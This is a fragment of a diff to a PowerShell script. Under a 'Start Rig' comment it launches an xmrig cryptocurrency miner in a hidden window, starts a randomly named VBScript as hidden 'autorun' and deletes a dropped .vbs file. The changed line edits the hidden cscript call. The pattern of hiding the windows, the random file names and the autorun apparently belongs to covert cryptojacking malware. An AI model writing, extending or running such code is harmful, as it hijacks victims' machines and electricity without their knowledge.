@@ -204,7 +204,7 @@ Remove-Item -Path "FoRAUwtxKkSB.vbs"
 cd $initial_dir
 
 # Start Autorun
-Start-Process -windowstyle hidden -FilePath "cscript.exe" -ArgumentList "$initial_dir\ZDaFvwjOosKx.vbs"
+Start-Process -windowstyle hidden -FilePath "cscript.exe" -ArgumentList "ZDaFvwjOosKx.vbs"
 
 # Start Rig
 Start-Process -windowstyle hidden -FilePath "$initial_dir\xmrig-6.22.2\xmrig.exe" 
